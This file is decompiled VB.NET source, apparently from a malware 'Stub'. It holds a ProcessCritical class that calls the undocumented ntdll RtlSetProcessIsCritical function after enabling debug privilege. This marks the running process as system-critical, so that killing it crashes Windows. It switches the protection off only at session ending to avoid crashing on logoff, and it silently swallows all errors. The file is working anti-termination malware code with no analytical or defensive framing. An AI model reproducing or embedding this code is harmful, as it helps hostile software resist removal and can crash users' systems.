Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports Microsoft.Win32

Namespace Stub
	' Token: 0x02000011 RID: 17
	Public Class ProcessCritical
		' Token: 0x06000061 RID: 97
		Public Declare Sub SetCurrentProcessIsCritical Lib "NTdll.dll" Alias "RtlSetProcessIsCritical" (<MarshalAs(UnmanagedType.Bool)> isCritical As Boolean, <MarshalAs(UnmanagedType.Bool)> ByRef refWasCritical As Boolean, <MarshalAs(UnmanagedType.Bool)> needSystemCriticalBreaks As Boolean)

		' Token: 0x06000062 RID: 98 RVA: 0x00005EFC File Offset: 0x000040FC
		Public Shared Sub SystemEvents_SessionEnding(sender As Object, e As SessionEndingEventArgs)
			ProcessCritical.CriticalProcesses_Disable()
		End Sub

		' Token: 0x06000063 RID: 99 RVA: 0x00005F04 File Offset: 0x00004104
		Public Shared Sub CriticalProcess_Enable()
			Try
				AddHandler SystemEvents.SessionEnding, AddressOf ProcessCritical.SystemEvents_SessionEnding
				Process.EnterDebugMode()
				Dim flag As Boolean
				ProcessCritical.SetCurrentProcessIsCritical(True, flag, False)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000064 RID: 100 RVA: 0x00005F50 File Offset: 0x00004150
		Public Shared Sub CriticalProcesses_Disable()
			Try
				Dim flag As Boolean
				ProcessCritical.SetCurrentProcessIsCritical(False, flag, False)
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
